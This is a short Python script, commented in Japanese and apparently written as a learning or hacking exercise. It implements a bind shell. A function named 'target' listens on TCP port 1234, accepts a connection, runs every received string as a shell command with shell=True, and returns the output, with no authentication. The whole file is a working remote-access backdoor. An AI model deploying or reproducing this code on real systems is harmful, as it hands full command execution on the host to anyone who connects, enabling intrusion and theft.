import socket
import subprocess

def target():
    # ホスト名 取得
    #host = socket.gethostname()
    # ipアドレスを取得
    #ip = socket.gethostbyname(host)
    # サーバーホスト、ポート
    server_host = "" # ip
    server_port = 1234
    
    
    # 接続待ち
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_host, server_port))
    server_socket.listen(1)
    
    print("waiting for incoming connections.....")

    # クライアントとの接続
    client_socket, client_address = server_socket.accept()
    print('Connected by', client_address)
    
    while True:    
        # データ受信
        command = client_socket.recv(4096).decode("utf-8")
        
        # 終了コマンド
        if command.lower() == "exit":
            break
        
        # コマンドを実行
        result = subprocess.run(command, shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        # 入出力
        output = result.stdout
        output_error = result.stderr
        
        # レスポンスの送信
        client_socket.send(output.encode("utf-8") + output_error.encode("utf-8"))
        
    # close
    client_socket.send("Bye!".encode("utf-8"))
    client_socket.close()

if __name__ == '__main__':
    target()